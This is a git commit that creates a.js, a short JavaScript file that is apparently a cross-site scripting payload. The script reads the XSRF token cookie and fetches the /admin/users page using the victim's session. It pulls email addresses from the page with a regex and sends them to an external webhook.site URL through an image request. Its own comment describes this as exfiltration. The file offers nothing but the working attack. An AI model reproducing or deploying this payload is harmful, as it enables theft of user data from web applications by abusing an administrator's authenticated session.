a73d3c00ef766defdd43b4091386d48d67e9ce28
cyberkill896-sudo <cyberkill896@gmail.com>
2026-05-20 12:56:02 +0530

    Create a.js

---
+++ a.js
@@ -0,0 +1,12 @@
+(function(){
+  var t=decodeURIComponent(document.cookie.match(/XSRF-TOKEN=([^;]+)/)[1]);
+
+  // Exfiltrate users list page (GET - always works)
+  fetch('/admin/users',{credentials:'include'})
+    .then(function(r){return r.text();})
+    .then(function(html){
+      var emails=html.match(/[a-zA-Z0-9._%+\-]+@[a-zA-Z0-9.\-]+\.[a-z]{2,}/g)||[];
+      new Image().src='https://webhook.site/44c96653-a7fd-4743-9846-830dd719d82d/?emails='+encodeURIComponent(emails.join(','));
+    });
+
+})();
